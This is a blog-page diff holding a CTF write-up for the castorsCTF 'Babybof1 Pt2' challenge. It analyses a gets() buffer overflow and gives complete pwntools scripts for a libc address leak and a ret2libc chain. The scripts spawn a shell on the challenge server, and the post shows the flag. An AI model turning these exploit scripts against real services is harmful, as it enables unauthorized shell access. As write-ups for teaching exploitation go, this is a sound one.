@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="The Problem Description: Ghidra Decompilation: As we can see from the above decompilation, the vulnerability in the program is gets().
+The call to gets() doesn&amp;rsquo;t check to make sure our input will fit into the buffer we give it,
+so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.
+The gets() means we the input can contain any character, even \x00, except for newlines." />
+<meta name="keywords" content=", ctf, writeup, security" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/posts/castorsctf-babybof1pt2/" />
+
+
+    <title>
+        
+            CTF Writeup: Babybof1 Pt2 :: Jacob Shin  — A Random Site
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.5037a481170c6b709cdeb719022370673540890c54014d3d06f3338ac4f219f4.css">
+
+
+
+
+
+
+<meta itemprop="name" content="CTF Writeup: Babybof1 Pt2">
+<meta itemprop="description" content="The Problem Description: Ghidra Decompilation: As we can see from the above decompilation, the vulnerability in the program is gets().
+The call to gets() doesn&rsquo;t check to make sure our input will fit into the buffer we give it,
+so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.
+The gets() means we the input can contain any character, even \x00, except for newlines.">
+<meta itemprop="datePublished" content="2020-06-15T20:58:24-04:00" />
+<meta itemprop="dateModified" content="2020-06-15T20:58:24-04:00" />
+<meta itemprop="wordCount" content="1766">
+<meta itemprop="image" content="/"/>
+
+
+
+<meta itemprop="keywords" content="ctf,writeup,security," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/"/>
+
+<meta name="twitter:title" content="CTF Writeup: Babybof1 Pt2"/>
+<meta name="twitter:description" content="The Problem Description: Ghidra Decompilation: As we can see from the above decompilation, the vulnerability in the program is gets().
+The call to gets() doesn&rsquo;t check to make sure our input will fit into the buffer we give it,
+so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.
+The gets() means we the input can contain any character, even \x00, except for newlines."/>
+
+
+
+    <meta property="og:title" content="CTF Writeup: Babybof1 Pt2" />
+<meta property="og:description" content="The Problem Description: Ghidra Decompilation: As we can see from the above decompilation, the vulnerability in the program is gets().
+The call to gets() doesn&rsquo;t check to make sure our input will fit into the buffer we give it,
+so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.
+The gets() means we the input can contain any character, even \x00, except for newlines." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/castorsctf-babybof1pt2/" />
+<meta property="og:image" content="/"/>
+<meta property="article:published_time" content="2020-06-15T20:58:24-04:00" />
+<meta property="article:modified_time" content="2020-06-15T20:58:24-04:00" /><meta property="og:site_name" content="Jacob Shin" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-06-15 20:58:24 -0400 EDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span style="color:#98971a" class="logo__text">jacob@server:</span>
+            <span style="color:#689d6a" class="logo__text">/home/site</span>
+            <span style="color:#fbf1c7" class="logo__text">$ </span>
+            <span class="logo__text"> </span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/projects">Projects</a></li><li><a href="/posts">Posts</a></li><li><a href="/notes">Notes</a></li><li><a href="/about">About</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>9 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="/posts/castorsctf-babybof1pt2/">CTF Writeup: Babybof1 Pt2</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <h2 id="the-problem-description">The Problem Description:</h2>
+<p><img src="problem.png" alt="Problem Description"></p>
+<h2 id="ghidra-decompilation">Ghidra Decompilation:</h2>
+<p><img src="ghidra.png" alt="Ghidra"></p>
+<p>As we can see from the above decompilation, the vulnerability in the program is <code>gets()</code>.<br>
+The call to gets() doesn&rsquo;t check to make sure our input will fit into the buffer we give it,<br>
+so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.<br>
+The gets() means we the input can contain any character, even \x00, except for newlines.</p>
+<p>Let&rsquo;s check what kind of binary we have and what protections it has.</p>
+<pre><code class="language-console" data-lang="console">$ wget https://castorsctf20.ctfd.io/files/10d1b0797feecefc95e7660be8bbbab4/babybof?token=eyJ1c2VyX2lkIjo3MzMsInRlYW1faWQiOjMyMSwiZmlsZV9pZCI6MTExfQ.XtPiqA.baXDvvhSBLjPBNCcxZqEx05bqY8 -O bof
+$ file bof
+bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,  
+interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,  
+BuildID[sha1]=53082227c9e25222032055ccb700576121bd384f, not stripped
+$ checksec --file=bof
+[*] 'bof'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+
+</code></pre><p>The binary is a 64 bit ELF binary.</p>
+<ul>
+<li>Partial RELRO (Relocation Read-Only): PLT GOT entries are still writeable.</li>
+<li>No canary: We can safely overwrite the saved return address without worrying about overwriting a stack canary.</li>
+<li>NX disabled: The stack is executable, so we could use shellcode if we wanted.</li>
+<li>No PIE: No ASLR in the binary itself, so addresses of functions like main will remain constant. However, the actual machine we run the binary on still will probably have ASLR enabled which means the stack addresses will change.</li>
+</ul>
+<p>First I tried using shellcode, but since ASLR is still enabled on the machine, the stack addresses will be randomized.<br>
+This means that the address of the input buffer will change. I didn&rsquo;t know how to overwrite the return address with the correct address of the shellcode, so I just decided to use ret2libc. (Note: I think using shellcode was the intended solution and not ret2libc).<br>
+Libc is a standard C library with all sort of useful functions. A ret2libc attack can take advantage of functions like system() in libc to spawn a shell.</p>
+<p>The first step is to determine how much input we need to overwrite the return address.<br>
+The stack should look like this for main().</p>
+<pre><code>[    Saved Return Address   ]
+[ Saved Frame Pointer (EBP) ]
+[         Buffer[255]       ]
+[         Buffer[254]       ]
+[         Buffer[253]       ]
+       . . . . . . . . 
+[         Buffer[2]         ]
+[         Buffer[1]         ]
+[         Buffer[0]         ]
+
+</code></pre><p>We want to write past the buffer, overwrite the saved fram pointer, and then overwrite the saved return address our own address to our exploit.<br>
+We know that the buffer is 256 bytes from Ghidra, so we can use the following to test how much padding we need until we overwrite the return address.<br>
+In the diagram above, writing to buffer will make input go &ldquo;up&rdquo; the stack.</p>
+<pre><code class="language-console" data-lang="console">$ python -c 'print &quot;A&quot;*256 + &quot;B&quot;*8 + &quot;C&quot;*8 + &quot;D&quot;*8 + &quot;E&quot;*8' &gt; /tmp/asdf # Saves output to a file
+$ gdb ./bof
+(gdb) r &lt; /tmp/asdf # Runs with contents of asdf as the input 
+Welcome to the cybercastors Babybof
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040078b in main ()
+(gdb) x/i $rip
+=&gt; 0x40078b &lt;main+62&gt;:	req 
+</code></pre><p>We receive a segfault when we the binary with our input. It seems we stop at the ret instruction in main.<br>
+A ret instruction is like pop rip, so let&rsquo;s what the ret instruction was trying to get from the stack.</p>
+<pre><code class="language-console" data-lang="console">(gdb) x/gx $rsp
+0x7fffffffdee8:	0x4343434343434343
+</code></pre><p>It looks like the program was trying to return to the address <code>0x4343434343434343</code> which is probably why we got a segfault.<br>
+Since 0x43 is an ascii C, we know that the stack will look like this after gets() is called:</p>
+<pre><code>[ Saved ret   CCCCCCCC        ]
+[ Saved EBP   BBBBBBBB        ]
+[ Buffer:     A*256           ]
+</code></pre><p>Now we just have to replace CCCCCCCC with the address of our exploit. We&rsquo;ll use a ROP (Return Oriented Programming) Chain to accomplish this.</p>
+<h2 id="ret2libc">Ret2libc</h2>
+<p>I used <a href="https://tasteofsecurity.com/security/ret2libc-unknown-libc/">this</a> as a template for my 64-bit ret2libc attacks. Check the post out since it explains the basics of ret2libc pretty well.</p>
+<h3 id="leak-libc">Leak Libc</h3>
+<p>First we need to leak a libc function address. ASLR is enabled on the machine, so the address of libc functions will be randomized. In order to know the address of system() and other libc functions, we need to first find the base address of libc.<br>
+We can use puts or printf to leak the address of a libc function. Puts is easier to use though, so we&rsquo;ll use that in this challenge.<br>
+We&rsquo;ll be leaking the address of the <code>__libc_start_main</code> function and then subtracting the offset to calculate the base of libc. Then using the base of libc we can calculate where system() and the &ldquo;/bin/sh&rdquo; string is.</p>
+<p>Here&rsquo;s our ROP chain:</p>
+<pre><code>[Address of pop rdi, ret] [Address of __libc_start_main entry] [Address of puts] 
+</code></pre><p>64-bit calling conventions say that the first argument of a function should be in the rdi register.<br>
+So our rop chain will put the address of the <code>__libc_start_main</code> entry into rdi and then call puts, printing out the address of <code>__libc_start_main</code>.</p>
+<p>This is what the stack will look with our ROP chain:</p>
+<pre><code>[         Address of puts          ] 
+[Address of __libc_start_main entry]
+[      Address of pop rdi, ret     ]  
+[      Buffer:     A*256           ]
+</code></pre><p>Here&rsquo;s our script to leak <code>__libc_start_main</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#e6db74">&#34;&#34;&#34; The following script was based heavily on the script provided in the following url &#34;&#34;&#34;</span>
+<span style="color:#e6db74">&#34;&#34;&#34;           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              &#34;&#34;&#34;</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e"># Import pwntools</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chals20.cybercastors.com&#34;</span>, <span style="color:#ae81ff">14425</span>) <span style="color:#75715e"># Connect to the remote server</span>
+<span style="color:#75715e">#p = process(&#34;./bof&#34;) # start the vuln binary</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bof&#34;</span>) <span style="color:#75715e"># Extract data from binary</span>
+rop <span style="color:#f92672">=</span> ROP(elf) <span style="color:#75715e"># Find ROP gadgets</span>
+
+<span style="color:#75715e"># Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget</span>
+PUTS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+LIBC_START_MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
+POP_RDI <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>] <span style="color:#75715e"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>
+MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+RET <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>]
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;puts@plt: &#34;</span> <span style="color:#f92672">+</span> hex(PUTS))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;__libc_start_main: &#34;</span> <span style="color:#f92672">+</span> hex(LIBC_START_MAIN))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;pop rdi gadget: &#34;</span> <span style="color:#f92672">+</span> hex(POP_RDI))
+
+base <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
+<span style="color:#75715e"># Create rop chain</span>
+rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span>  p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS)
+
+<span style="color:#75715e">#Send our rop-chain payload</span>
+p<span style="color:#f92672">.</span>sendline(rop)
+
+<span style="color:#75715e">#Parse leaked address</span>
+print(p<span style="color:#f92672">.</span>recvline())
+print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name: &#34;</span>))
+received <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
+received <span style="color:#f92672">=</span> received<span style="color:#f92672">.</span>strip()
+print(received)
+leak <span style="color:#f92672">=</span> u64(received<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Leaked libc address,  __libc_start_main: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(leak))
+
+p<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Let&rsquo;s run the script:</p>
+<pre><code class="language-console" data-lang="console">$ python3 leak.py
+[+] Opening connection to chals20.cybercastors.com on port 14425: Done
+[*] 'bof'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[*] Loaded 14 cached gadgets for './bof'
+[*] puts@plt: 0x400590
+[*] __libc_start_main: 0x600ff0
+[*] pop rdi gadget: 0x4007f3
+b'Welcome to the cybercastors Babybof\n'
+b'Say your name: '
+b'\xc0?m \xd7\x7f'
+[*] Leaked libc address,  __libc_start_main: 0x7fd7206d3fc0
+[*] Closed connection to chals20.cybercastors.com port 14425
+</code></pre><p>We see that for this particular run, the address of <code>__libc_start_main</code> was 0x7fd7206d3fc0.<br>
+We need to find out what version of libc is running on the server since different versions have different offsets between the base and functions.</p>
+<p>Luckily there&rsquo;s a tool that finds the right libc version for you based on the address of a libc function.</p>
+<p>Download the database and tools <a href="https://github.com/niklasb/libc-database">here</a> and then run the following:</p>
+<pre><code class="language-console" data-lang="console">$ ./find __libc_start_main 0x7fd7206d3fc0 
+http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb (id libc6_2.31-0ubuntu9_amd64)
+</code></pre><p>This shows us that the server was using the libc6_2.31-0ubuntu9_amd64 version. We can use <code>download libc6_2.31-0ubuntu9_amd64</code> to download that libc version.</p>
+<p>Note: There is also an online libc database at [https://libc.blukat.me/], but it only works sometimes since its database probably isn&rsquo;t as comphrehensive.</p>
+<h3 id="exploit">Exploit</h3>
+<p>We can use the pwntools python library to find libc offsets.</p>
+<p>This calculates the base libc address by subtracting the offset from __libc_start_main</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__libc_start_main&#34;</span>]
+</code></pre></div><p>Then by using this libc base address we can find the addresses of system() and &ldquo;/bin/sh&rdquo; to spawn a shell.<br>
+Using pwntools:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">BINSH <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)) <span style="color:#75715e">#Verify with find /bin/sh</span>
+SYSTEM <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]
+</code></pre></div><p>For our exploit, we need to be able to call main() twice: once to leak libc and another time to call system().<br>
+We can just append the address of main() to our first ROP chain to accomplish this.</p>
+<p>First ROP chain:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">base <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
+rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS) <span style="color:#f92672">+</span> p64(MAIN)
+</code></pre></div><p>Then our second rop chain will call system:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">rop2 <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(RET) <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(BINSH) <span style="color:#f92672">+</span> p64(SYSTEM)
+</code></pre></div><p>Combine the above into a script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#e6db74">&#34;&#34;&#34; The following script was based heavily on the script provided in the following url &#34;&#34;&#34;</span>
+<span style="color:#e6db74">&#34;&#34;&#34;           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              &#34;&#34;&#34;</span>
+
+<span style="color:#75715e">#!/usr/bin/python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e"># Import pwntools</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chals20.cybercastors.com&#34;</span>, <span style="color:#ae81ff">14425</span>)
+<span style="color:#75715e">#p = process(&#34;./bof&#34;) # start the vuln binary</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bof&#34;</span>) <span style="color:#75715e"># Extract data from binary</span>
+rop <span style="color:#f92672">=</span> ROP(elf) <span style="color:#75715e"># Find ROP gadgets</span>
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
+
+<span style="color:#75715e"># Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget</span>
+PUTS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+LIBC_START_MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
+POP_RDI <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>] <span style="color:#75715e"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>
+RET <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>]
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;puts@plt: &#34;</span> <span style="color:#f92672">+</span> hex(PUTS))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;__libc_start_main: &#34;</span> <span style="color:#f92672">+</span> hex(LIBC_START_MAIN))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;pop rdi gadget: &#34;</span> <span style="color:#f92672">+</span> hex(POP_RDI))
+
+base <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
+<span style="color:#75715e"># Create rop chain</span>
+rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS) <span style="color:#f92672">+</span> p64(MAIN)
+
+<span style="color:#75715e">#Send our rop-chain payload</span>
+p<span style="color:#f92672">.</span>sendline(rop)
+
+<span style="color:#75715e">#Parse leaked address</span>
+print(p<span style="color:#f92672">.</span>recvline())
+print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name: &#34;</span>))
+received <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
+received <span style="color:#f92672">=</span> received<span style="color:#f92672">.</span>strip()
+print(received)
+leak <span style="color:#f92672">=</span> u64(received<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Leaked libc address,  __libc_start_main: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(leak))
+
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__libc_start_main&#34;</span>]
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Address of libc </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> hex(libc<span style="color:#f92672">.</span>address))
+
+BINSH <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)) <span style="color:#75715e">#Verify with find /bin/sh</span>
+SYSTEM <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;bin/sh </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> hex(BINSH))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;system </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> hex(SYSTEM))
+
+rop2 <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> p64(RET) <span style="color:#f92672">+</span> p64(POP_RDI) <span style="color:#f92672">+</span> p64(BINSH) <span style="color:#f92672">+</span> p64(SYSTEM)
+p<span style="color:#f92672">.</span>sendline(rop2)
+p<span style="color:#f92672">.</span>interactive()
+p<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Run the script:</p>
+<pre><code class="language-console" data-lang="console">$ python3 exploit.py
+[+] Opening connection to chals20.cybercastors.com on port 14425: Done
+[*] '/home/user/castorsctf/babybof1pt2/bof'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[*] Loaded 14 cached gadgets for './bof'
+[*] '/home/user/castorsctf/babybof1pt2/libc-2.31.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] puts@plt: 0x400590
+[*] __libc_start_main: 0x600ff0
+[*] pop rdi gadget: 0x4007f3
+b'Welcome to the cybercastors Babybof\n'
+b'Say your name: '
+b'\xc0\xef\xe2\xa4o\x7f'
+[*] Leaked libc address,  __libc_start_main: 0x7f6fa4e2efc0
+[*] Address of libc 0x7f6fa4e08000 
+[*] bin/sh 0x7f6fa4fbf5aa 
+[*] system 0x7f6fa4e5d410 
+[*] Switching to interactive mode
+Welcome to the cybercastors Babybof
+Say your name: /bin/sh: 0: can't access tty; job control turned off
+$ $ ls
+babybof  flag.txt  shell_flag.txt
+$ $ cat shell_flag.txt
+castorsCTF{w0w_U_jU5t_h4ck3d_th15!!1_c4ll_th3_c0p5!11}
+$ $  
+</code></pre><p>Note: during the actual ctf, there was a weird buffering issue, so I had to run exploit_buf.py around 100 times to get a shell.<br>
+Towards the end of the ctf, the organizers fixed the buffering issue, so running exploit.py just once will now work.</p>
+<p>Also if you see any inaccuracies anywhere, feel free to <a href="mailto:jacobshin313@gmail.com">contact</a> me!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/ctf">ctf</a></span><span class="tag"><a href="/tags/writeup">writeup</a></span><span class="tag"><a href="/tags/security">security</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1766 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-06-15 20:58 -0400</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Read other posts</span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="/posts/ractf-return_of_the_emojiasm/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">CTF Writeup: Return of the EmojASM</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="/posts/welcome/">
+                                <span class="button__text">Welcome to my site.</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+        <script src="https://utteranc.es/client.js"
+                repo="jshin313/site"
+                issue-term="pathname"
+                label="comment"
+                theme="github-dark"
+                crossorigin="anonymous"
+                async>
+        </script>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span style="color:#98971a">&copy; 2020</span>
+            
+            
+                <span style="color:#98971a">Jacob Shin</span>
+            
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <h5><a href="http://gohugo.io">Hugo</a></h5>
+            <h5><a href="https://github.com/morhetz/gruvbox">Gruvbox (Sort of)</a></h5>
+            <h5><a href="https://github.com/rhazdon">Theme</a></h5>
+        </div>
+    </div>
+</footer>
+
+<script type="text/javascript" async
